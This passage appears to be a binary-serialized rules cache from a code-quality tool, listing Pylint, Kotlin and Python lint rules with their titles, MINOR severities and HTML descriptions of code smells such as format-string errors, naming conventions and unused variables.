PylintR1720 Unnecessary "else" after "raise""MINOR*py2R1720:⁄Used in order to highlight an unnecessary block of code following an if containing a raise statement. As such, it will warn when it encounters an else following a chain of ifs, all of them containing a raise statement.Z
CODE_SMELL
ö
Pylint:W1305â
PylintW1305TFormat string contains both automatic field numbering and manual field specification"MINOR*py2W1305:ÉUsed when a PEP 3101 format string contains both automatic field numbering (e.g. '{}') and manual field specification (e.g. '{0}').Z
CODE_SMELL
Î
Pylint:W1306⁄
PylintW1306Missing format attribute"MINOR*py2W1306:êUsed when a PEP 3101 format string uses an attribute specifier ({0.length}), but the argument passed for formatting doesn't have that attribute.Z
CODE_SMELL
¡
Pylint:W1649∞
PylintW16494Accessing a deprecated function on the string module"MINOR*py2W1649:KUsed when accessing a string function that has been deprecated in Python 3.Z
CODE_SMELL
˛
Pylint:W1301Ì
PylintW1301&Unused key in format string dictionary"MINOR*py2W1301:ïUsed when a format string that uses named conversion
      specifiers is used with a dictionary that contains keys not required by the format string.Z
CODE_SMELL
‘
Pylint:W1303√
PylintW1303*Missing keyword argument for format string"MINOR*py2W1303:hUsed when a PEP 3101 format string that uses named fields doesn't receive one or more required keywords.Z
CODE_SMELL
’
Pylint:W1304ƒ
PylintW1304Unused format argument"MINOR*py2W1304:}Used when a PEP 3101 format string that uses named fields is used with an argument that is not required by the format string.Z
CODE_SMELL
£
Pylint:R1709í
PylintR1709$Boolean expression may be simplified"MINOR*py2R1709:=Emitted when redundant pre-python 2.5 ternary syntax is used.Z
CODE_SMELL
º
Pylint:W1302´
PylintW1302Invalid format string"MINOR*py2W1302:eUsed when a PEP 3101 format string is invalid. This message can't be emitted when using Python < 2.7.Z
CODE_SMELL
œ
Pylint:R1708æ
PylintR1708EDo not raise StopIteration in generator, use return statement instead"MINOR*py2R1708:«According to PEP479, the raise of StopIteration to end the loop of a generator may lead to hard to find bugs. This PEP specify that raise StopIteration has to be replaced by a simple return statementZ
CODE_SMELL
ó
Pylint:W0212Ü
PylintW0212.Access to a protected member of a client class"MINOR*py2W0212:¶Used when a protected member (i.e. class member with a name beginning with an underscore) is access outside the class or a descendant of the class where it's defined.Z
CODE_SMELL
π
Pylint:W0333®
PylintW0333Use of the `` operator"MINOR*py2W0333:‡Used when the deprecated "``" (backtick) operator is used instead of the str() function.
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3ABackticksUsage'>BackticksUsage</a> instead.</p>Z
CODE_SMELL
ö
Pylint:W0211â
PylintW02114Static method with "self" or "cls" as first argument"MINOR*py2W0211:£Used when a static method has "self" or a value specified in valid- classmethod-first-arg option or valid-metaclass-classmethod-first-arg option as first argument.Z
CODE_SMELL
±
Pylint:W0332†
PylintW0332%Use of "l" as long integer identifier"MINOR*py2W0332:…Used when a lower case "l" is used to mark a long integer. You should use a upper case "L" since the letter "l" looks too much like the digit "1" This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
±
Pylint:W1662†
PylintW16626Using a variable that was bound inside a comprehension"MINOR*py2W1662:∏Emitted when using a variable, that was bound in a comprehension handler, outside of the comprehension itself. On Python 3 these variables will be deleted outside of the comprehension.Z
CODE_SMELL
¢
Pylint:W0331ë
PylintW0331Use of the <> operator"MINOR*py2W0331:…Used when the deprecated "<>" operator is used instead of "!=".
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AInequalityUsage'>InequalityUsage</a> instead.</p>Z
CODE_SMELL
Í
Pylint:W1300Ÿ
PylintW1300/Format string dictionary key should be a string"MINOR*py2W1300:yUsed when a format string that uses named conversion specifiers is used with a dictionary whose keys are not all strings.Z
CODE_SMELL
Ω
Pylint:W1660¨
PylintW1660/Accessing a removed attribute on the sys module"MINOR*py2W1660:LUsed when accessing a field on sys module that has been removed in Python 3.Z
CODE_SMELL
∫
Pylint:W1661©
PylintW1661=Using an exception object that was bound by an except handler"MINOR*py2W1661:∫Emitted when using an exception, that was bound in an except handler, outside of the except handler. On Python 3 these exceptions will be deleted once they get out of the except handler.Z
CODE_SMELL
û
Pylint:R1710ç
PylintR1710_Either all return statements in a function should return an expression, or none of them should."MINOR*py2R1710:¸According to PEP8, if any return statement returns an expression, any return statements where no value is returned should explicitly state this as return None, and an explicit return statement should be present at the end of the function (if reachable)Z
CODE_SMELL
∏
Pylint:E1307ß
PylintE1307#Argument does not match format type"MINOR*py2E1307:SUsed when a type required by format string is not suitable for actual argument typeZ
CODE_SMELL
‘
Pylint:R1715√
PylintR1715^Consider using dict.get for getting values from a dict if a key is present or a default if not"MINOR*py2R1715:≥Using the builtin dict.get for getting a value from a dictionary if a key is present or a default if not, is simpler and considered more idiomatic, although sometimes a bit slowerZ
CODE_SMELL
˚
Pylint:R1716Í
PylintR17160Simplify chained comparison between the operands"MINOR*py2R1716:àThis message is emitted when pylint encounters boolean operation like"a < b and b < c", suggesting instead to refactor it to "a < b < c"Z
CODE_SMELL
™
Pylint:R1718ô
PylintR1718"Consider using a set comprehension"MINOR*py2R1718:≈Although there is nothing syntactically wrong with this code, it is hard to read and can be simplified to a set comprehension.Also it is faster since you don't need to create another transient listZ
CODE_SMELL
≤
Pylint:R1717°
PylintR1717)Consider using a dictionary comprehension"MINOR*py2R1717:∆Although there is nothing syntactically wrong with this code, it is hard to read and can be simplified to a dict comprehension.Also it is faster since you don't need to create another transient listZ
CODE_SMELL
≠
Pylint:R1711ú
PylintR1711+Useless return at end of function or method"MINOR*py2R1711:øEmitted when a single "return" or "return None" statement is found at the end of function or method definition. This statement can safely be removed because Python will implicitly return NoneZ
CODE_SMELL
í
Pylint:R1712Å
PylintR17125Consider using tuple unpacking for swapping variables"MINOR*py2R1712:öYou do not have to use a temporary variable in order to swap variables. Using "tuple unpacking" to directly swap variables makes the intention more clear.Z
CODE_SMELL
¸
Pylint:R1713Î
PylintR1713LConsider using str.join(sequence) for concatenating strings from an iterable"MINOR*py2R1713:nUsing str.join(sequence) is faster, uses less memory and increases readability compared to for-loop iteration.Z
CODE_SMELL
∏
Pylint:R1714ß
PylintR1714Consider using "in""MINOR*py2R1714:‚To check if a variable is equal to one of many values, combine the values into a tuple and check if the variable is contained "in" it instead of checking for equality against each of the values.This is faster and less verbose.Z
CODE_SMELL
ä
Pylint:W0107˘
PylintW0107Unnecessary pass statement"MINOR*py2W0107:≠Used when a "pass" statement that can be avoided is encountered.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2772'>S2772</a> instead.</p>Z
CODE_SMELL
®
Pylint:W0104ó
PylintW0104!Statement seems to have no effect"MINOR*py2W0104:EUsed when a statement doesn't have (or at least seems to) any effect.Z
CODE_SMELL
≈
Pylint:W0105¥
PylintW0105String statement has no effect"MINOR*py2W0105:‰Used when a string is used as a statement (which of course has no effect). This is a particular case of W0104 with its own message so you can easily disable it if you're using those strings as documentation, instead of comments.Z
CODE_SMELL
‘
Pylint:W0106√
PylintW0106!Expression is assigned to nothing"MINOR*py2W0106:qUsed when an expression that is not a function call is assigned to nothing. Probably something else was intended.Z
CODE_SMELL
ƒ
Pylint:W0102≥
PylintW0102#Dangerous default value as argument"MINOR*py2W0102:_Used when a mutable value as list or dictionary is detected in a default value for an argument.Z
CODE_SMELL
≈
Pylint:W0222¥
PylintW0222Method signature discrepancy"MINOR*py2W0222:gUsed when a method signature is different than in the implemented interface or in an overridden method.Z
CODE_SMELL
≈
Pylint:W0223¥
PylintW0223!Abstract method is not overridden"MINOR*py2W0223:bUsed when an abstract method (i.e. raise NotImplementedError) is not overridden in concrete class.Z
CODE_SMELL
¢
Pylint:W0101ë
PylintW0101Unreachable code"MINOR*py2W0101:œUsed when there is some code behind a "return" or "raise" statement, which will never be accessed.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1763'>S1763</a> instead.</p>Z
CODE_SMELL
“
Pylint:W0221¡
PylintW0221Parameter number discrepancy"MINOR*py2W0221:tUsed when a method has a different number of arguments than in the implemented interface or in an overridden method.Z
CODE_SMELL
Ë
Pylint:E0108◊
PylintE0108.Duplicate argument name in function definition"MINOR*py2E0108:xDuplicate argument names in function definitions are syntax errors.
        <p>This rule was added in Pylint 0.28.0.</p>Z
CODE_SMELL
ò
Pylint:E0109á
PylintE0109Missing argument to reversed()"MINOR*py2E0109:8Used when reversed() builtin didn't receive an argument.Z
CODE_SMELL
ﬁ
Pylint:E1310Õ
PylintE1310$Suspicious argument in lstrip/rstrip"MINOR*py2E1310:xThe argument to a str.{l,r}strip call contains a duplicate character.
      <p>This rule was added in Pylint 0.28.0.</p>Z
CODE_SMELL
’
Pylint:W1202ƒ
PylintW1202Logging format interpolation"MINOR*py2W1202:ˆUsed when a logging statement has a call form of "logging.<logging method>(format_string.format(format_args...))". Such calls should use % formatting instead, but leave interpolation to the logging function by passing the parameters as arguments.Z
CODE_SMELL
î
Pylint:W1307É
PylintW1307,Using invalid lookup key in format specifier"MINOR*py2W1307:•Used when a PEP 3101 format string uses a lookup specifier ({a[1]}), but the argument passed for formatting doesn't contain or doesn't have that key as an attribute.Z
CODE_SMELL
”
Pylint:W1308¬
PylintW1308$Duplicate string formatting argument"MINOR*py2W1308:mUsed when we detect that a string formatting is repeating an argument instead of using named string argumentsZ
CODE_SMELL
Ô
Pylint:W0235ﬁ
PylintW0235Useless super delegation"MINOR*py2W0235:îUsed whenever we can detect that an overridden method is useless, relying on super() delegation to do the same thing as another method from the MRO.Z
CODE_SMELL
º
Pylint:W1203´
PylintW1203*Usage of % formatting in logging functions"MINOR*py2W1203:œUsed when a logging statement has a call form of "logging.method(f"..."))". Such calls should use % formatting instead, but leave interpolation to the logging function by passing the parameters as arguments.Z
CODE_SMELL
Ê
Pylint:W0233’
PylintW02336__init__ method from a non direct base class is called"MINOR*py2W0233:nUsed when an __init__ method is called on a class which is not in the direct ancestors for the analysed class.Z
CODE_SMELL
¯
Pylint:W0234Á
PylintW0234__iter__ returns non-iterator"MINOR*py2W0234:òUsed when an __iter__ method returns something which is not an iterable (i.e. has no `next` method).
        <p>This rule was added in Pylint 1.1.0.</p>Z
CODE_SMELL
ç
Pylint:W1201¸
PylintW1201>Specify string format arguments as logging function parameters"MINOR*py2W1201:åUsed when a logging statement has a call form of
               "logging.<logging method>(format_string % (format_args...))". Such
               calls should leave string interpolation to the logging method itself
               and be written "logging.<logging method>(format_string,
               format_args...)" so that the program may avoid incurring the cost of
               the interpolation in those cases in which no message will be
               logged. For more, see http://www.python.org/dev/peps/pep-0282/.Z
CODE_SMELL
ÿ
Pylint:W0111«
PylintW01115Assignments should not be made to new Python keywords"MINOR*py2W0111:aUsed when assignment will become invalid in future Python release due to introducing new keyword.Z
CODE_SMELL
–
Pylint:W0231ø
PylintW0231-__init__ method from base class is not called"MINOR*py2W0231:aUsed when an ancestor class method has an __init__ method which is not called by a derived class.Z
CODE_SMELL
£
Pylint:W0232í
PylintW0232Class has no __init__ method"MINOR*py2W0232:EUsed when a class has no __init__ method, neither its parent classes.Z
CODE_SMELL
µ
Pylint:R0201§
PylintR0201Method could be a function"MINOR*py2R0201:ÿUsed when a method doesn't use its bound instance, and
               so could be written as a function.
         <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2325'>S2325</a> instead.</p>Z
CODE_SMELL
Ë
Pylint:W0110◊
PylintW01107map/filter on lambda could be replaced by comprehension"MINOR*py2W0110:ÓUsed when a lambda is the first argument to "map" or "filter". It could be clearer as a list comprehension or generator expression. This message can't be emitted when using Python >= 3.0.
      <p>This rule was added in Pylint 0.27.0.</p>Z
CODE_SMELL
˜
Pylint:E0238Ê
PylintE0238Invalid __slots__ object"MINOR*py2E0238:úUsed when an invalid __slots__ is found in class. Only a string, an iterable or a sequence is permitted.
        <p>This rule was added in Pylint 1.2.0.</p>Z
CODE_SMELL
ö
Pylint:E0239â
PylintE0239Inheriting from non-class"MINOR*py2E0239:?Used when a class inherits from something which is not a class.Z
CODE_SMELL
§
Pylint:E0119ì
PylintE0119$Format function is not called on str"MINOR*py2E0119:ΩEmitted when format function is not called on str object. e.g doing print("value: {}").format(123) instead of print("value: {}".format(123)). This might not be what the user intended to do.Z
CODE_SMELL
¬
Pylint:R0202±
PylintR02029Consider using a decorator instead of calling classmethod"MINOR*py2R0202:GUsed when a class method is defined without using the decorator syntax.Z
CODE_SMELL
ƒ
Pylint:R0203≥
PylintR0203:Consider using a decorator instead of calling staticmethod"MINOR*py2R0203:HUsed when a static method is defined without using the decorator syntax.Z
CODE_SMELL
ö
Pylint:E0235â
PylintE02358__exit__ must accept 3 arguments: type, value, traceback"MINOR*py2E0235:üUsed when the __exit__ special method, belonging to a context manager, does not accept 3 arguments (type, value, traceback).
        <p>This rule was added in Pylint 1.1.0.</p>
        <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2733'>S2733</a> instead.</p>Z
CODE_SMELL
œ
Pylint:E0116æ
PylintE01160'continue' not supported inside 'finally' clause"MINOR*py2E0116:]Emitted when the `continue` keyword is found inside a finally clause, which is a SyntaxError.Z
CODE_SMELL
∂
Pylint:E0237•
PylintE02371Assigning to attribute not defined in class slots"MINOR*py2E0237:CUsed when assigning to an attribute not defined in the class slots.Z
CODE_SMELL
Ù
Pylint:E0236„
PylintE0236@Invalid object in __slots__, must contain only non empty strings"MINOR*py2E0236:rUsed when an invalid (non-string) object occurs in __slots__.
         <p>This rule was added in Pylint 1.2.0.</p>Z
CODE_SMELL
¬
Pylint:E0110±
PylintE0110Abstract class instantiated"MINOR*py2E0110:eUsed when an abstract class with `abc.ABCMeta` as metaclass has abstract methods and is instantiated.Z
CODE_SMELL
´
Pylint:E0111ö
PylintE0111/The first reversed() argument is not a sequence"MINOR*py2E0111:πUsed when the first argument to reversed() builtin isn't a sequence
      (does not implement __reversed__, nor __getitem__ and __len__
      <p>This rule was added in Pylint 1.2.0.</p>Z
CODE_SMELL
¯
Pylint:R0205Á
PylintR0205GClass inherits from object, can be safely removed from bases in python3"MINOR*py2R0205:oUsed when a class inherit from object, which under python3 is implicit, hence can be safely removed from bases.Z
CODE_SMELL
√
Pylint:W0108≤
PylintW0108Lambda may not be necessary"MINOR*py2W0108:ÂUsed when the body of a lambda expression is a function call on the same argument list as the lambda itself; such lambda expressions are in all but a few cases replaceable with the function being called in the body of the lambda.Z
CODE_SMELL
°
Pylint:W0109ê
PylintW0109Duplicate key in dictionary"MINOR*py2W0109:DUsed when a dictionary expression binds the same key multiple times.Z
CODE_SMELL
Å
Pylint:W0125
PylintW01253Using a conditional statement with a constant value"MINOR*py2W0125:ãEmitted when a conditional statement (If or ternary if) uses a constant value for its test. This might not be what the user intended to do.Z
CODE_SMELL
‹
Pylint:W0122À
PylintW0122Use of exec"MINOR*py2W0122:éUsed when you use the "exec" statement (function for Python 3), to discourage its usage. That doesn't mean you cannot use it !
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AExecStatementUsage'>ExecStatementUsage</a> instead.</p>Z
CODE_SMELL
∑
Pylint:W0123¶
PylintW0123Use of eval"MINOR*py2W0123:ÈUsed when you use the "eval" function, to discourage its usage. Consider using `ast.literal_eval` for safely evaluating strings containing Python expressions from untrusted sources.
        <p>This rule was added in Pylint 1.2.0.</p>Z
CODE_SMELL
¥
Pylint:W0124£
PylintW0124?Following "as" with another context manager looks like a tuple."MINOR*py2W0124:≤Emitted when a `with` statement component returns multiple values and uses name binding with `as` only for a part of those values, as in with ctx() as a, b. This can be misleading, since it's not clear if the context manager returns a tuple or if the node without a name binding is another context manager.Z
CODE_SMELL
À
Pylint:W0120∫
PylintW0120-Else clause on loop without a break statement"MINOR*py2W0120:€Loops should only have an else clause if they can exit early with a break statement, otherwise the statements under else should be on the same scope as the loop itself.
      <p>This rule was added in Pylint 0.28.0.</p>Z
CODE_SMELL
Œ
Pylint:W0121Ω
PylintW0121=Use raise ErrorClass(args) instead of raise ErrorClass, args."MINOR*py2W0121:ŒUsed when the alternate raise syntax 'raise foo, bar' is used instead of 'raise foo(bar)'.
        This message can't be emitted when using Python >= 3.0.
        <p>This rule was added in Pylint 1.0.0.</p>Z
CODE_SMELL

Pylint:C0412o
PylintC0412Ungrouped imports"MINOR*py2C0412:-Used when imports are not grouped by packagesZ
CODE_SMELL
z
Pylint:C0413j
PylintC0413Wrong import position"MINOR*py2C0413:$Used when code and imports are mixedZ
CODE_SMELL
‚
Pylint:C0414—
PylintC0414-Import alias does not rename original package"MINOR*py2C0414:sUsed when an import alias is same as original package.e.g using import numpy as numpy instead of import numpy as npZ
CODE_SMELL
§
Pylint:E0240ì
PylintE0240$Inconsistent method resolution order"MINOR*py2E0240:>Used when a class has an inconsistent method resolution order.Z
CODE_SMELL
v
Pylint:E0241f
PylintE0241Duplicate bases"MINOR*py2E0241:&Used when a class has duplicate bases.Z
CODE_SMELL
†
Pylint:C0410è
PylintC0410Multiple imports on one line"MINOR*py2C0410:BUsed when import statement importing multiple modules is detected.Z
CODE_SMELL
…
Pylint:C0411∏
PylintC0411Wrong import order"MINOR*py2C0411:uUsed when PEP8 import order is not respected (standard imports first, then third-party libraries, then local imports)Z
CODE_SMELL
ú
Pylint:C0401ã
PylintC0401%Wrong spelling of a word in a comment"MINOR*py2C0401:5Used when a word in comment is not spelled correctly.Z
CODE_SMELL
†
Pylint:C0402è
PylintC0402'Wrong spelling of a word in a docstring"MINOR*py2C0402:7Used when a word in docstring is not spelled correctly.Z
CODE_SMELL
û
Pylint:C0403ç
PylintC0403!Invalid characters in a docstring"MINOR*py2C0403:;Used when a word in docstring cannot be checked by enchant.Z
CODE_SMELL
ƒ
kotlin:S4663≥
kotlinS4663'Multi-line comments should not be empty"MINOR*kotlin:›<p>An empty multi-line comment is likely to be a mistake and doesn't help to improve the readability of the code. For these reasons, it should be
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* */

/*

 */
</pre>Z
CODE_SMELL
ü
kotlin:S105è
kotlinS105(Tabulation characters should not be used"MINOR*kotlin:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
≤
kotlin:S1940°
kotlinS1940%Boolean checks should not be inverted"MINOR*kotlin:Õ<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!(a == 2)) { ... }  // Noncompliant
val b = !(i &lt; 10)  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ... }
val b = (i &gt;= 10)
</pre>Z
CODE_SMELL
Ö
kotlin:S1125Ù
kotlinS1125(Boolean literals should not be redundant"MINOR*kotlin:ù<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);

booleanVariable = if (booleanMethod()) true else false;
booleanVariable = if (booleanMethod()) true else exp;
booleanVariable = if (booleanMethod()) false else exp;
booleanVariable = if (booleanMethod()) exp else true;
booleanVariable = if (booleanMethod()) exp else false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
doSomething(true);

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;
</pre>Z
CODE_SMELL
‡
kotlin:S101–
kotlinS1012Class names should comply with a naming convention"MINOR*kotlin:<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>Z
CODE_SMELL
á
kotlin:S100˜
kotlinS1003Method names should comply with a naming convention"MINOR*kotlin:ñ<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>Z
CODE_SMELL
´
kotlin:S1481ö
kotlinS1481(Unused local variables should be removed"MINOR*kotlin:√<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>Z
CODE_SMELL
”
kotlin:S117√
kotlinS117RLocal variable and function parameter names should comply with a naming convention"MINOR*kotlin:√<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>Z
CODE_SMELL
±
python:S1131†
pythonS1131.Lines should not end with trailing whitespaces"MINOR*py:«<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the
opportunity to do so. </p>Z
CODE_SMELL
¶
python:S1578ï
pythonS15783Module names should comply with a naming convention"MINOR*py:∑<p>Shared coding conventions allow teams to collaborate effectively. For that reason, module names should conform to a defined standard.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/lQAl">CERT, MSC09-C.</a> - Character encoding: Use subset of ASCII for safety </li>
</ul>Z
CODE_SMELL
‚
python:S1226—
pythonS12268Function parameters initial values should not be ignored"MINOR*py:ı<p>While it is technically correct to assign to parameters from within function bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters should be, if not treated as read-only, then at least read before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(strings, param):
    param = 1  # NonCompliant
</pre>ZBUG
Ω
python:S113≠
pythonS1130Files should contain an empty newline at the end"MINOR*py:”<p>Some tools such as Git work better when files end with an empty line. This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<p>&lt;pre&gt;</p>
<p>+class Test:</p>
<p>+ pass</p>
<p> \ No newline at end of file</p>
<p>&lt;/pre&gt;</p>Z
CODE_SMELL
å
python:S116¸
pythonS1162Field names should comply with a naming convention"MINOR*py:†<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[_a-z][_a-z0-9]*$</code>:</p>
<pre>
class MyClass:
  myField = 1
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass:
  my_field = 1
</pre>Z
CODE_SMELL
–
python:S117¿
pythonS117RLocal variable and function parameter names should comply with a naming convention"MINOR*py:ƒ<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Exceptions</h2>
<p>Loop counters are ignored by this rule.</p>
<pre>
for i in range(limit):  # Compliant
    print(i)
</pre>Z
CODE_SMELL
é
python:S2325˝
pythonS2325GMethods and properties that don't access instance data should be static"MINOR*py:ã<p>Class methods that don't access instance data can and should be static because they yield more performant code.</p>
<p>To implement a static method in Python one should use either <code>@classmethod</code> or <code>@staticmethod</code>. A class method receives the
class as implicit first argument, just like an instance method receives the instance. A static method does not receive an implicit first argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Utilities:
    def do_the_thing(self, arg1, arg2, ...):  # Noncompliant
        #...
</pre>
<h2>Compliant Solution</h2>
<pre>
class Utilities:
    @classmethod
    def do_the_thing(cls, arg1, arg2, ...):
        #...
</pre>
<p>or</p>
<pre>
class Utilities:
    @staticmethod
    def do_the_thing(arg1, arg2, ...):
        #...
</pre>
<h2>Exceptions</h2>
<p>Methods which raise or may raise a <code>NotImplementedError</code> are ignored.</p>Z
CODE_SMELL
 
*python:LongIntegerWithLowercaseSuffixUsageõ
python#LongIntegerWithLowercaseSuffixUsage$Long suffix "L" should be upper case"MINOR*py:Æ<p>The long suffix should always be written in uppercase, i.e. 'L', as the lowercase 'l' can easily be confused with the digit one '1'.</p>
<h2>Noncompliant Code Example</h2>
<pre>
return 10l  // Noncompliant; easily confused with one zero one
</pre>
<h2>Compliant Solution</h2>
<pre>
return 10L
</pre>Z
CODE_SMELL
…
python:S1707∏
pythonS1707MTrack "TODO" and "FIXME" comments that do not contain a reference to a person"MINOR*py:¿<p>TODO and FIXME comments are typically intended to be short-lived; they are placeholders and reminders that programmers leave for themselves.
Unfortunately, even with the best of intentions, those comments are not always acted on and removed in a timely manner. Thus, they can become
mysterious, lingering cruft in a code base, reducing both readability and understand-ability.</p>
<p>This rule flags all FIXME and TODO comments that do not have an attribution matching the specified regular expression immediately after the FIXME
or TODO. Ideally, such comments will also contain information about what needs to be fixed or done, but this rule does not enforce that.</p>
<h2>Noncompliant Code Example</h2>
<pre>
# TODO
</pre>
<h2>Compliant Solution</h2>
<pre>
# TODO(ganncamp) per the business partners, more checks needed
</pre>Z
CODE_SMELL

python:S2772ﬂ
pythonS2772$"pass" should not be used needlessly"MINOR*py:ê<p>The use of a <code>pass</code> statement where it's not required by the syntax is pure cruft and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    def __init__(self, log="", who="", date=0, files=[]):
        self.log = log
        self.files = files
        self.who = who
        self.date = date
        pass    # Noncompliant

    def lookup():
        pass    # Compliant; method can't be empty
</pre>
<h2>Compliant Solution</h2>
<pre>
    def __init__(self, log="", who="", date=0, files=[]):
        self.log = log
        self.files = files
        self.who = who
        self.date = date

    def lookup():
        pass
</pre>Z
CODE_SMELL
ﬂ
python:S101œ
pythonS1012Class names should comply with a naming convention"MINOR*py:Û<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class myClass:
   ...
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass:
   ...
</pre>Z
CODE_SMELL
π
python:S100©
pythonS1003Method names should comply with a naming convention"MINOR*py:Ã<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all method
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: ^[a-z_][a-z0-9_]{2,30}$</p>
<pre>
class MyClass:
    def MyMethod(a,b):
        ...
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass:
    def my_method(a,b):
        ...
</pre>Z
CODE_SMELL
Ì
python:S2737‹
pythonS27379"except" clauses should do more than raise the same issue"MINOR*py:¯<p>An <code>except</code> clause that only rethrows the caught exception has the same effect as omitting the <code>except</code> altogether and
letting it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = {}
try:
    a[5]
except KeyError:
    raise  # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
a = {}
try:
    a[5]
except KeyError as e:
    logging.exception('error while accessing the dict')
    raise e
</pre>Z
CODE_SMELL
±
python:S1722†
pythonS1722 New-style classes should be used"MINOR*py:’<p>The new style of class creation, with the declaration of a parent class, created a unified object model in Python, so that the type of an
instantiated class is equal to its class. In Python 2.2-2.7, this is not the case for old-style classes. In Python 3+ all classes are new-style
classes. However, since the behavior can differ from 2.2+ to 3+, explicitly inheriting from <code>object</code> (if there is no better candidate) is
recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass():
    pass
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass(object):
    pass
</pre>Z
CODE_SMELL
ƒ
python:S3626≥
pythonS3626'Jump statements should not be redundant"MINOR*py:·<p>Jump statements, such as <code>return</code>, <code>break</code> and <code>continue</code> let you change the default flow of program execution,
but jump statements that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def redundant_jump(x):
    if x == 1:
        print(True)
        return  # NonCompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
def redundant_jump(x):
    if x == 1:
        print(True)
</pre>
<h2>Exceptions</h2>
<ul>
  <li> No issue is raised if the jump statement is the only statement of a statement suite: </li>
</ul>
<pre>
def my_function(x):
    if x &gt; 5:
        do_something()
    elif x == 0:
        return # ok even it could be changed to "pass"
    else:
        do_something_else()
</pre>
<ul>
  <li> No issue is raised for <code>return None</code> because this was certainly done on purpose to be explicit that a function is really returning
  <code>None</code>. </li>
</ul>Z
CODE_SMELL
¿
python:S1721Ø
pythonS17215Parentheses should not be used after certain keywords"MINOR*py:œ<p>Parentheses are not required after the <code>assert</code>, <code>del</code>, <code>elif</code>, <code>except</code>, <code>for</code>,
<code>if</code>, <code>in</code>, <code>not</code>, <code>raise</code>, <code>return</code>, <code>while</code>, and <code>yield</code> keywords, and
using them unnecessarily impairs readability. They should therefore be omitted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x = 1
while (x &lt; 10):
    print "x is now %d" % (x)
    x += 1
</pre>
<h2>Compliant Solution</h2>
<pre>
x = 1
while x &lt; 10:
    print "x is now %d" % (x)
    x += 1
</pre>Z
CODE_SMELL
Õ
python:S1481º
pythonS1481(Unused local variables should be removed"MINOR*py:È<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def hello(name):
    message = "Hello " + name # Noncompliant
    print(name)
for i in range(10):
    foo()
</pre>
<h2>Compliant Solution</h2>
<pre>
def hello(name):
    message = "Hello " + name
    print(message)
for _ in range(10):
    foo()
</pre>
<h2>Exceptions</h2>
<p><code>_</code> as well as tuples will not raise an issue for this rule. The following examples are compliant:</p>
<pre>
for _ in range(10):
    do_something()
username, login, password = auth
do_something_else(username, login)
</pre>Z
CODE_SMELL
õ
python:S139ã
pythonS139:Comments should not be located at the end of lines of code"MINOR*py:ß<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
